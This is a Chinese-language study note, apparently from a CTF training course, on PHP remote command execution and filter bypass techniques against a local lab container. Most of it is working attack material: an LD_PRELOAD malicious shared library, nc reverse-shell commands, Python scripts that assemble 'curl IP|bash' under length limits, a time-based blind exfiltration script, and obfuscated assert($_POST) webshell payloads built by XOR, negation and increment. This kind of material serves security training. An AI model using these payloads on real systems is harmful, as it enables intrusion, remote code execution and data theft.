# 来自b站up[橙子科技工作室](https://space.bilibili.com/271803648/?spm_id_from=333.788.upinfo.detail.click)的php命令执行

## 1:环境搭建

使用docker进行部署，docker镜像：mcc0624/cmd:latest

国内docker网站：docker.1ms.run

端口：

- 80：5.0php   
- 81：7.0php
- 82：7.3php

## 2：常见命令执行函数

![image-20250805101230692](C:\Users\zdx33\AppData\Roaming\Typora\typora-user-images\image-20250805101230692.png)

重点是能否**回显**，以及**参数**如何

system:	system(string $command,int &$return_var = ?)      第一个参数是命令字符串，第二个参数可选，返回执行状态。**有直接回显**！如果执行成功，`system()` 返回命令的**最后一行输出**。

exec:	exec(string $command,array &$output=? ,int &$return_var=?)第二个参数存放命令执行结果，默认无回显。如果执行成功，`exec()` 返回命令的**最后一行输出**。所有echo有最后一行输出

passthru:	passthru(string $command,int &$return_var = ? )   和system特别像，输出二进制流，只有涉及到图片相关才有区别（利用二进制数据构建图片），也可以**直接回显**

shell_exec:	shell_exec(string $command)      没有直接回显    函数返回结果字符串 要echo、print

反引号\`：	echo \`ls\`

popen(string $command,string $mode)   执行命令后建立管道读取或写入命令的输入/输出 mode打开管道的方式   用fgets   fread等操作

```php
<?php
header("content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
$array =   array(
    array("pipe","r"),   //标准输入
    array("pipe","w"),   //标准输出内容
    array("file","/tmp/error-output.txt","a")    //标准输出错误
);

$fp = proc_open($cmd,$array,$pipes);   //打开一个进程通道
echo stream_get_contents($pipes[1]);    //为什么是$pipes[1]，因为1是输出内容
proc_close($fp);
?>
```

pcntl_exec:	pcntl_exec(string $path , array $args = ?,array $envs = ?) 这是一个需要额外安装的模块，同时path必须是一个可执行二进制文件或者开头指明解释器的脚本    比如

```
#! /bin/bash
```

或者

```
#! /usr/bin/python3
```

## 3：常见过滤函数

preg_match正则过滤

```php
<?php
header("content-type:text/html;charset=utf-8"); 
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['cmd'])){
    $c = $_GET['cmd'];
    if(!preg_match("/exec|system|popen|proc_open|\`/i", $c)){  #没有过滤passthru
        eval($c);
    }
    else{
        echo "你是黑客么？";
    }
} 
#eval 把字符串构建成php代码，所以这里也可以使用include（）配合data伪协议，php伪协议等
```

## 4：LD_PRELOAD绕过

使用场景：当过滤特别严格，过滤了所有命令执行函数时

LD_PRELOAD是什么?：`LD_PRELOAD` 是 Linux/Unix 系统中的一个环境变量，用于**在程序运行时优先加载指定的共享库（`.so` 文件）**，从而可以**覆盖或修改**程序原本调用的标准库函数。

可以利用它替换系统库函数，拦截系统调用等

常用：mail     内嵌在php中			imagick	需要安装扩展

```bash
#vim demo.php
```

```php
<?php
mail('','','','');
?>
```

```bash
#strace -o 1.txt -f php demo.php            
```

`strace` 是 Linux 系统下的一个**系统调用跟踪工具**，用于监控进程与 Linux 内核的交互，可以显示程序执行期间的所有**系统调用（System Calls）**和**信号（Signals）**。

```bash
#cat 1.txt | grep execve
```

检查调用了哪些子进程，execve不会创建新进程，而是在原有进程的基础上执行另一个程序，进程ID保持不变。

发现有一个sendmail   ，readelf发现调用geteuid函数

自己写一个.so动态链接库，写一个恶意的geteuid函数   要先unsetenv("LD_PRELOAD")

然后命令执行putenv("LD_PRELOAD=./demo.so");mail('','','','');

![image-20250805112204846](C:\Users\zdx33\AppData\Roaming\Typora\typora-user-images\image-20250805112204846.png)

具体应用：

目标可以直接使用蚁剑连接，但是被限制只能访问当前目录和/tmp，命令执行函数被全部禁用。putenv可以使用

使用蚁剑上传一个.php文件，设置LD_PRELOAD为要一起上传的恶意.so库文件

```php
<?php
putenv("LD_PRELOAD=./demo.so");
mail('','','','');
?>
```

恶意函数如下：

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload(){
	system("cat /flag > /tmp/flag");#也可以直接nc反弹shell    nc xxxx  -e /bin/bash
}
int geteuid(){
	unsetenv("LD_PRELOAD");#最好写不然有时候会报错
	payload();
}
```

然后访问上传的.php文件，即可在/tmp下找到flag文件

如果要传递任意指令，则可以如下：

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int geteuid(){
    const char* cmdline = getenv("EVIL_CMDLINE");
    if(getenv("LD_PRELOAD") == NULL)
        return 0;
    unsetenv("LD_PRELOAD");
    system(cmdline);
}
```

```php+HTML
<?php
$cmd = $_REQUEST["cmd"];
$out_path = $_REQUEST["outpath"];
$evil_cmdline = $cmd.">"$out_path." 2>&1";
echo "<br /><b>cmdline:</b>".$evil_cmdline;
putenv("EVIL_CMDLINE=".$evil_cmdline");

$so_path = $_REQUEST["sopath"];
putenv("LD_PRELOAD=".$so_path);
main('','','','');
echo "<br /><b>output:<b/><br />".nl2br(file_get_contents($out_path));

?>
```

## 5：蚁剑及pcntl绕过函数过滤

#### 蚁剑：

![image-20250807111349150](C:\Users\zdx33\AppData\Roaming\Typora\typora-user-images\image-20250807111349150.png)

![image-20250807111404906](C:\Users\zdx33\AppData\Roaming\Typora\typora-user-images\image-20250807111404906.png

github地址：https://github.com/AntSword-Store/as_bypass_php_disable_functions

#### pcntl_exec函数：

函数原型：pcntl_exec(string $path, array $args = ?, array $envs = ?)   要**额外安装**

参数path：h必须是一个可执行二进制文件路径或者开头指明解释器的脚本   比如/bin/bash -c 'ls'

参数args：一个传递给程序的字符串数组

参数envs：一个传递给程序作为环境变量的字符串数组

info信息：**没有禁用**该函数

**没有回显：**

1. **cat文件并重定向输出到有权限读取的路径，如上**
2. **反弹shell**

示例如下：

```cmd=pcntl_exec("/bin/bash",array("-c","nc 192.168.59.128 33333 -e /bin/bash"));```

## 6：操作系统连接符

| ;            | &                                            | \|                                       | &&                                     | \|\|                                   |
| :----------- | -------------------------------------------- | ---------------------------------------- | -------------------------------------- | -------------------------------------- |
| 顺序执行命令 | 需要url编码为%26，前面一个命令在**后台**执行 | 管道符，前面命令的结果作为后面命令的参数 | 前一个命令执行**成功**才执行后一个命令 | 前一个命令执行**失败**才执行后一个命令 |

## 7：空格过滤绕过

1. 重定向字符<>```cat /flag   cat</flag   cat<>/flag```
2. 大括号```{cat,/flag}```
3. 使用$IFS代替；$IFS ${IFS}  $IFS$9                 ```ls$IFS-l```        防止后面的内容被当作变量名使用${IFS}或者$IFS$9，$9是当前系统shell进程第九个命令行参数，一般为空。（到10就要${10}）
4. url编码	%09(Tab)   %20(space)            (基本没用)

## 8：文件名过滤（正则匹配绕过）

过滤php、system、flag

1. **通配符 ？ *** 绕过         ?匹配任意单字符相当于正则的 \.    \*匹配任意字符串，相当于正则的\.\*

   通配符和正则语法对比

   | 功能         | 通配符写法 | 正则表达式写法 | 区别说明                 |
   | :----------- | :--------- | :------------- | :----------------------- |
   | 匹配任意字符 | `?`        | `.`            | 通配符 `?` = 正则的 `.`  |
   | 匹配任意数量 | `*`        | `.*`           | 通配符 `*` = 正则的 `.*` |
   | 匹配字符组   | `[abc]`    | `[abc]`        | 语法相同                 |
   | 匹配范围     | `[a-z]`    | `[a-z]`        | 语法相同                 |
   | 排除字符     | `[!abc]`   | `[^abc]`       | 通配符用 `!`，正则用 `^` |

2. **单引号**，**双引号**绕过        `cat /fl''ag`

3. **反斜杠  `\`** 绕过 `cat /fl\ag.t\xt`          `\`表示转义 (也可以充当换行，要出现在行尾)

4. **特殊变量**：$1到$9  $@和$*等   `cat /fl$1ag.t$9xt`

5. **内联执行**  自定义字符串，再拼接
   `a=f;b=la;c=g;cat $a$b$c.txt`表示`cat flag.txt`

6. 利用linux中的环境变量
   `echo $PATH`
   `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games`
   `echo f${PATH:5:1}`   `fl`

## 9：常用文件读取命令绕过（同8）

preg_match("/flag|php|cat|sort|shell|\\\'/i",$cmd)

可以使用**8中方法**绕过正则

**一些可以读取文件的linux指令如下，过滤不严可以使用**

1. tac：反向显示
2. more：一页一页显示
3. less：与more类似
4. tail：显示末尾几行
5. nl：显示并输出行号
6. od：以二进制读取
7. xxd：和od类似
8. sort：主要用于排序文件
9. uniq：删除或报告重复的行
10. file  -f：通过报错查看具体内容
11. grep：查找指定字符串

## 10：编码绕过

```python
import base64

a = b'cat flag.php'
b = base64.b64encode(a)
print(b)
#b=b'Y2F0IC9mbGFnLnBocA=='
```

`echo Y2F0IC9mbGFnLnBocA== | base64 -d | bash`

或者$(echo Y2F0IC9mbGFnLnBocA== | base64 -d)   $()和反引号  **`**作用相同

base32编码     hex编码等

```python
import binascii

s = b'tac flag'
h = binascii.b2a_hex(s)
print(h)
#h = b'74616320666c6167'
```

`echo 74616320666c6167 | xxd -r -p`

使用shellcode编码，直接printf就可以转码

`printf "\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"`

`flag.php`

总结，编码有**base64系列**，**hex**，**shellcode**

执行方法有 **| bash**      **$()**     **反引号``**      **system**

## 11：无回显时间盲注

页面无回显，并且无法反弹webshell，尝试命令盲注

根据返回的时间来判断

读取文件指定行的指定位置的字符

`sleep`     `awk NR`

`cat flag.php | awk NR == 1 `查看第一行

`cat flag.php | awk NR == 1 | cut -c 1`查看第一行第一个字符

使用if语句(**if和[]左右必须要有空格**)

`if [];then ; fi`

 `if [ $(cat flag.php | awk NR == 1 | cut -c 1) == a ];then echo 'right';fi`

无回显，则使用sleep指令

 `if [ $(cat flag.php | awk NR == 1 | cut -c 1) == a ];then sleep 2;fi`

python脚本示例

```python
#多线程docker也可能跟不上
import requests
import time
url = "http://192.168.59.128:18080/class08/1.php"
result = ""
for i in range(1,6):#行数
    for j in range(1,11):#每行字符数
        for k in range(32,127):#可打印ascii字符范围32~126
            time.sleep(0.1)#防止太快docker性能跟不上
            payload = "?cmd=" + f"if [ `ls | awk NR=={i} | cut -c {j}` == {chr(k)} ];then sleep 2;fi"
            #这里用try是因为超时才代表猜解字符正确，才能执行下面代码
            try:
                requests.get(url=url+payload,timeout=(1.5,1.5))
            except requests.exceptions.Timeout:
                result = result + chr(k)
                print(result)
                break
    result +=""
```

## 12：长度过滤绕过

#### 前置知识

\> 和 \>\>符号

命令换行  \

`ls -t`将文件名按照**修改时间**列出

Linux 文件有三种时间戳：（**M-A-C**）

1. **`mtime` (Modification Time)**
   - 文件内容最后一次被修改的时间（`ls -t` 默认用它排序）。
   - 查看方式：`ls -l` 或 `stat 文件名`。
2. **`ctime` (Change Time)**                  在FAT中是Creation  Time
   - 文件元数据（如权限、所有者）最后一次变更的时间。
   - 查看方式：`ls -lc` 或 `stat 文件名`。
3. **`atime` (Access Time)**
   - 文件最后一次被读取的时间。
   - 查看方式：`ls -lu` 或 `stat 文件名`。

**组合运用**

使用>创建文件，文件名是要执行的命令的部分加\用于命令换行

然后用ls -t排列组合  把执行结果写入文件`ls -t > x`

用`sh x`执行或者`. x`执行（ .是source简写）



dir：按列输出不换行，d在子母中靠前

*相当于$(dir *)：比如echo zdx

rev：反转文件每一行内容



#### 长度限制为7的绕过方式

题目示例：

```php
<?php
highlight_file(__FILE__);
error_reporting(E_ALL);
function filter($argv){
    $a = str_replace("/\*|\?|/","=====",$argv);#阻止通配符
    return $a;
}
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 7) {#限制长度<=7
    exec(filter($_GET['cmd']));
} else  {
    echo "flag in local path flag file!!";
}
```

期望执行的命令

`cat flag|nc 192.168.59.128 7777       #无回显则反弹shell`   

或者`nc 192.168.59.128 7777 -e /bin/bash`

分割时注意空格和反斜杠都要转义

python示例：

```python
import requests
import time

url = 'http://192.168.59.128:18080/class09/2/index.php?cmd='
cmds = ['>cat\\',
        '>\ fl\\',
        '>ag\|\\',
        '>nc\ \\',
        '>192.\\',
        '>168.\\',
        '>59.1\\',
        '>28\ \\',
        '>7777']
#如果顺序请求，则要ls -tr，多一个字符'r'，所以一般逆序请求
s = requests.session()
cmds.reverse()
for cmd in cmds:
    time.sleep(1)
    s.get(url=url+cmd)
s.get(url=url+'ls -t>a')
s.get(url=url+'sh a')
```



#### 长度限制为5的绕过方式

第一个问题：`ls -t>a`超限制

第二个问题：一个空格要写成`>\ \\`只能构造一次空格的文件名

解决方法：更换期望执行的命令`curl 192.168.59.128|bash`

先构造`ls -t>a`,只能执行`ls`默认按照ascii排

将不按顺序的先写进文件，也就是`ls\\`  ，后面的用>>追加

python代码示例：

```python
import time
import requests
baseurl = "http://192.168.1.6:19080/class09/3/index.php?cmd="
s = requests.session()

# 将ls -t 写入文件_
list=[
    ">ls\\",
    "ls>_",
    ">\ \\",
    ">-t\\",
    ">\>y",
    "ls>>_"
]

# curl 192.168.1.161/1|bash
list2=[
    ">bash",
    ">\|\\",
    ">\/\\",
    ">61\\",
    ">1\\",
    ">1.\\",
    ">8.\\",
    ">16\\",
    ">2.\\",
    ">19\\",
    ">\ \\",
    ">rl\\",
    ">cu\\"
]
for i in list:
    time.sleep(1)
    url = baseurl+str(i)
    s.get(url)

for j in list2:
    time.sleep(1)
    url = baseurl+str(j)
    s.get(url)

s.get(baseurl+"sh _")
s.get(baseurl+"sh y")
```



#### 长度限制为4的绕过方式

新的问题：追加命令长度至少为5`ls>>_`

将ip地址变成16进制

python代码示例：

```python
#encoding:utf-8
import time
import requests
baseurl = "http://192.168.1.6:19080/class09/4/ffff.php?cmd="
s = requests.session()

# 将ls -t 写入文件g
list=[
    ">g\;",
    ">g\>",
    ">ht-",
    ">sl",
    ">dir",
    "*>v",
    ">rev",
    "*v>x"
]

# curl 192.168.1.161|bash
list2= [
    ">ash",
    ">b\\",
    '>\|\\',
    '>A1\\',
    '>01\\',
    '>A8\\',
    '>C0\\',
    '>0x\\',
    '>\ \\',
    '>rl\\',
    '>cu\\'
]
for i in list:
    time.sleep(1)
    url = baseurl+str(i)
    s.get(url)

for j in list2:
    time.sleep(1)
    url = baseurl+str(j)
    s.get(url)

s.get(baseurl+"sh x")
s.get(baseurl+"sh g")
```

## 13：无参数RCE

![image-20250808161248490](C:\Users\zdx33\AppData\Roaming\Typora\typora-user-images\image-20250808161248490.png)

正则：`/[^\W]+\((?R)?\)/`

(?R)?：

- `(?R)` 是递归引用整个正则表达式模式
- `?` 表示递归部分是可选的

整个正则匹配嵌套的函数调用比如a()	a(bdf())	a(fdasf(asdf()))

#### HTTP 请求标头   (php7)

`getallheaders()`获取所有HTTP请求标头(反序,数组)

`?code=print_r(pos(getallheaders()))`获取burpsuite看到的最后一项（数组的第一项）

`?code=eval(pos(getallheaders()))`直接写system()

也可以使用`implode`函数，注意要加注释符号

#### 利用全局变量RCE  (php5/7)

get_defined_vars()   返回所有已定义变量的值，所组成的数组

`?code=print_r(get_defined_vars());`第一个成员就是一个数组

`eval(end(pos(get_defined_vars())));&cmd=system('ls');`所以一次pos找到get数组，一次end找到cmd

#### session RCE (php5)

`?code=print_r(session_id(session_start()));`

为什么不能用于php7？

session_start()返回true or flase，作为参数传递给session_id。php5中会忽略，实际当作参数为空，返回当前的会话 ID。但是php7**类型检查**更加严格，session_id**期望参数**是一个字符串（用于设置会话 ID），遇到bool时认为无效返回空字符串

抓包修改PHPSESSID的值为./flag

用`?code=show_source(session_id(session_start()));`

`?code=eval(hex2bin(session_id(session_start())))`        把PHPSESSID改成要执行命令的hex编码（一些符号不能写入PHPSESSID，要编码）

#### 使用scandir()进行文件读取

1. scandir() — 列出指定路径中的文件和目录(PHP 5, PHP 7, PHP 8)
2. getcwd() — 取得当前工作目录(PHP 4, PHP 5, PHP 7, PHP 8)
3. current() — 返回数组中的当前值(PHP 4, PHP 5, PHP 7, PHP 8) 
4. pos() — current()的别名函数，功能完全相同
5. array_reverse() — 返回单元顺序相反的数组(PHP 4, PHP 5, PHP 7, PHP 8)
6. next() — 将数组中的内部指针向后移动(PHP 4, PHP 5, PHP 7, PHP 8)
7. prev() — 将指针往回移动一位
8. end() — 将指针移动到数组末尾
9. reset() — 将指针移动到数组开头
10. array_rand — 从数组中随机取出一个或多个随机键
11. array_flip() — 交换数组中的键和值(PHP 4, PHP 5, PHP 7, PHP 8)
12. chdir() — 系统调用函数（同ed），用于改变当前工作目录
13. strrev() — 用于反转给定的字符串
14. crypt() — 用来来加密，目前Linux平台上加密的方法大致有MD5, DES, 3 DES
15. hebrevc() — 把希伯来文本从右至左的流转换为左至右的流。

**localeconv()**	只要知道它第一个键值是`.`  可以代表本目录

`?code=print_r(scandir(current(localeconv())));`

`?code=print_r(end(scandir(getcwd())));`

getcwd()相当于current(localeconv())的作用

**如何读取文件？show_source	highlight_file	readfile()**

查看上级目录，使用dirname()

`?code=print_r(dirname(getcwd()));`

一直向上目录

`dirname(chdir(dirname(getcwd())))`

使用array_rand()和array_flip()组合随机读取（移动指针操作也行啊）

 `crypt(serialize(array()))`每次结果随机，最后可能出现/

用strrev()反转，用ord()和chr()取第一个字符/

`chr(ord(strrev(crypt(serialize(array())))))`

使用scandir()读取。

## 14：无字母数字绕过

1. 异或运算绕过
2. 取反绕过
3. 自增绕过
4. 特殊符号过滤

#### 异或运算绕过

利用符号进行异或运算，获取想要得到的值

给出脚本

```python
target = 'phpinfo'
def generate_xor_payload(target:str):
    result1 = []
    result2 = []
    for char in target:
        found = False
        for i in range(32,127):
            if chr(i).isalnum():
                continue
            for j in range(32,127):
                if chr(j).isalnum():
                    continue
                if (i ^ j) == ord(char):
                    result1.append(chr(i))
                    result2.append(chr(j))
                    found = True
                    break
            if found:
                break
    return ''.join(result1),''.join(result2)

if __name__ == "__main__":
    part1,part2=generate_xor_payload(target)
    print(f"异或运算第一部分：{part1}")
    print(f"异或运算第二部分：{part2}")
```

phpinfo = "+(+).&/" ^ "[@[@@@@"

`?cmd = $_="+(+).&/" ^ "[@[@@@@";$_();`

直接提交有问题，+会被当空格，需要url编码

**php5   assert($\_POST['\_'])**

![image-20250809120234772](C:\Users\zdx33\AppData\Roaming\Typora\typora-user-images\image-20250809120234772.png)

**php7   ``**

问题是``执行命令不回显？反弹shell

#### 取反运算绕过

```php
$_=~(%9E%8C%8C%9A%8D%8B);    //这里利用取反符号把它取回来，$_=assert
$__=~(%A0%AF%B0%AC%AB);      //$__=_POST
$___=$$__;                   //$___=$_POST
$_($___[_]);                 //assert($_POST[_]);
放到一排就是：
$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);
```

#### 自增运算绕过

获取字母A a然后自增获取其他字母

```php
<?php
$_ = [].'';
echo $_[$__];#$__不存在，相当于0
?>
```

```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```



混乱杂谈

`cmd=?><?=`{${~"%a0%b8%ba%ab"}{%a0}}`?>&%a0=ls`

为什么要闭合标签？因为``无回显

`<?=  ?>`等同于`<?php echo  ?>`有一个echo的回显作用

| 方式                  | PHP 5 支持 | PHP 7+ 支持 | 备注               |
| :-------------------- | :--------- | :---------- | :----------------- |
| `$func()`（可变函数） | ✅ 支持     | ✅ 支持      | PHP 4.3+ 都支持    |
| `('func')()`          | ❌ 不支持   | ✅ 支持      | **仅 PHP 7+ 支持** |
| `call_user_func()`    | ✅ 支持     | ✅ 支持      | 所有版本通用       |

所以当$被过滤时，就可以用php7的 () () 写法
